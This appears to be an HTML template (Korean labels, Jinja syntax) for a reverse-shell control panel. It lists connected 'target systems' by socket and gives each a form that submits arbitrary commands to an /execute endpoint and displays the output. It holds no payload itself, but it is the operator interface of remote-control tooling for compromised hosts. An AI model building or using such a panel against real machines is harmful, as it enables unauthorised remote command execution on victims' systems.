<!-- index.html (웹 페이지) -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>리버스 쉘 명령어 실행</title>
</head>
<body>
    <h1>리버스 쉘 명령어 실행</h1>
    
    <h3>타겟 시스템 목록</h3>
    <ul>
        {% for target_id, client_socket in targets.items() %}
        <li>{{ target_id }} 
            <form action="/execute" method="post" style="display:inline;">
                <input type="hidden" name="target_id" value="{{ target_id }}">
                <input type="text" name="command" placeholder="명령어를 입력하세요" required>
                <button type="submit">실행</button>
            </form>
        </li>
        {% endfor %}
    </ul>

    <h3>실행 결과</h3>
    <pre>{{ result }}</pre>
</body>
</html>
